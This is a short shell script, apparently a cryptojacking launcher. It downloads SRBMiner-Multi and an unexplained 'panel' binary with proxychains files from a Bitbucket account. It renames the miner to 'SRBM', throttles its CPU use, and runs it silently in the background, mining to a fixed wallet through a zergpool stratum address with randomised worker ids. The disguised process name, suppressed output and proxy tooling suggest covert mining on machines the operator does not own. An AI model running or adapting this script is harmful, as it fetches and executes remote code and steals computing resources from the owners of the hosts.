apt update ; apt install cpulimit htop neofetch -y
wget -O hamz.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.1/SRBMiner-Multi-2-3-1-Linux.tar.xz && tar -xf hamz.tar.gz
wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(curl ifconfig.me)
cd SRBMiner-Multi-2-3-1/
mv SRBMiner-MULTI  ..
cd ..
mv SRBMiner-MULTI SRBM
sudo cpulimit --background -e SRBM -l 620
./SRBM --algorithm yespoweric --pool stratum+ssl://yespoweric.mine.zergpool.com:16238 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 50 + 1 )) --cpu-priority value 5 --enable-workers-ramp-up --background --cpu-threads 0 --disable-gpu &> /dev/null &
